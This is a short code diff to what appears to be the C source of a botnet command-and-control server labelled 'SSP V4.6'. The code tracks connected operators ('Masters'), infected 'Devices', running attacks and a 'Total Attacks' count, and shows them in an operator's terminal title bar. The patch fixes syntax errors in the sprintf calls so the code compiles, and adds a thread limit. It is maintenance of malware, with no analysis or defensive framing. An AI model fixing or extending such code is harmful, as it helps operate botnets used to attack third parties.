@@ -23,6 +23,7 @@
 #include <string.h>
 
 #define MAXFDS 1000000
+#define MAX_THREADS 1000
 
 struct login_info 
 {
@@ -489,19 +490,19 @@ void *BotWorker(void *sock)
 		while(1) 
 		{
 			memset(string, 0, 2048);
-			sprintf(string, "%c]0; [/] SSP V4.6 [+] Masters: %d [+] Devices: %d [+] Running: %d/%d [+] Total Attacks: %d %c", '\033', OperatorsConnected, BotsConnected(), attacksRunning, maxAttacksRunning, totalAttacks '\007');
+			sprintf(string, "%c]0; [/] SSP V4.6 [+] Masters: %d [+] Devices: %d [+] Running: %d/%d [+] Total Attacks: %d %c", '\033', OperatorsConnected, BotsConnected(), attacksRunning, maxAttacksRunning, totalAttacks, '\007');
 			if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 			sleep(0.25);
 
-			sprintf(string, "%c]0; [-] SSP V4.6 [+] Masters: %d [+] Devices: %d [+] Running: %d/%d [+] Total Attacks: %d %c", '\033', OperatorsConnected, BotsConnected(), attacksRunning, maxAttacksRunning, totalAttacks '\007');
+			sprintf(string, "%c]0; [-] SSP V4.6 [+] Masters: %d [+] Devices: %d [+] Running: %d/%d [+] Total Attacks: %d %c", '\033', OperatorsConnected, BotsConnected(), attacksRunning, maxAttacksRunning, totalAttacks, '\007');
 			if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 			sleep(0.25);
 
-			sprintf(string, "%c]0; [\\] SSP V4.6 [+] Masters: %d [+] Devices: %d [+] Running: %d/%d [+] Total Attacks: %d %c", '\033', OperatorsConnected, BotsConnected(), attacksRunning, maxAttacksRunning, totalAttacks '\007');
+			sprintf(string, "%c]0; [\\] SSP V4.6 [+] Masters: %d [+] Devices: %d [+] Running: %d/%d [+] Total Attacks: %d %c", '\033', OperatorsConnected, BotsConnected(), attacksRunning, maxAttacksRunning, totalAttacks, '\007');
 			if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 			sleep(0.25);
 
-			sprintf(string, "%c]0; [|] SSP V4.6 [+] Masters: %d [+] Devices: %d [+] Running: %d/%d [+] Total Attacks: %d %c", '\033', OperatorsConnected, BotsConnected(), attacksRunning, maxAttacksRunning, totalAttacks '\007');
+			sprintf(string, "%c]0; [|] SSP V4.6 [+] Masters: %d [+] Devices: %d [+] Running: %d/%d [+] Total Attacks: %d %c", '\033', OperatorsConnected, BotsConnected(), attacksRunning, maxAttacksRunning, totalAttacks, '\007');
 			if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 			sleep(0.25);
 		}
